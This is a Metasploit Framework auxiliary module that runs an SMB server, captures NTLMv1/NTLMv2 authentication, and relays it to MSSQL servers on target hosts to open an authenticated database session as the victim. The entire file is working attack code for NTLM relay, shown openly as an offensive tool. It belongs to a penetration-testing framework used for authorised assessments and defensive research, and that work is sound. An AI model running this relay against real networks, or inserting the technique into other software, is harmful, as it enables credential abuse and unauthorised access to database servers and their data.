##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::RelayServer
  include Msf::Auxiliary::CommandShell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows SMB to MSSQL Relay',
        'Description' => %q{
          This module supports running an SMB server which validates credentials, and
          then attempts to execute a relay attack against an MSSQL server on the
          configured RHOSTS hosts.

          Supports SMBv2, SMBv3, and captures NTLMv1 as well as NTLMv2 hashes.
          SMBv1 is not supported - please see https://github.com/rapid7/metasploit-framework/issues/16261
        },
        'Author' => [
          'Spencer McIntyre'
        ],
        'License' => MSF_LICENSE,
        'DefaultTarget' => 0,
        'Actions' => [
          [ 'CREATE_MSSQL_SESSION', { 'Description' => 'Create an MSSQL session' } ]
        ],
        'PassiveActions' => [ 'CREATE_MSSQL_SESSION' ],
        'DefaultAction' => 'CREATE_MSSQL_SESSION',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ACCOUNT_LOCKOUTS ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(1433)
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true])
      ]
    )
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      :mssql,
      datastore['RPORT'],
      datastore['RHOSTS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def check_options
    unless framework.features.enabled?(Msf::FeatureManager::MSSQL_SESSION_TYPE)
      fail_with(Failure::BadConfig, 'This module requires the `mssql_session_type` feature to be enabled. Please enable this feature using `features set mssql_session_type true`')
    end
  end

  def run
    check_options

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    print_good('Relay succeeded')
    session_setup(relay_connection, relay_identity)
  rescue StandardError => e
    elog('Failed to setup the session', error: e)
  end

  # @param [Msf::Exploit::Remote::SMB::Relay::NTLM::Target::MSSQL::Client] relay_connection
  # @return [Msf::Sessions::MSSQL]
  def session_setup(relay_connection, relay_identity)
    mssql_session = Msf::Sessions::MSSQL.new(
      relay_connection.sock,
      {
        client: relay_connection,
        **relay_connection.detect_platform_and_arch
      }
    )
    domain, _, username = relay_identity.partition('\\')
    datastore_options = {
      'DOMAIN' => domain,
      'USERNAME' => username
    }
    start_session(self, nil, datastore_options, false, mssql_session.rstream, mssql_session)
  end
end
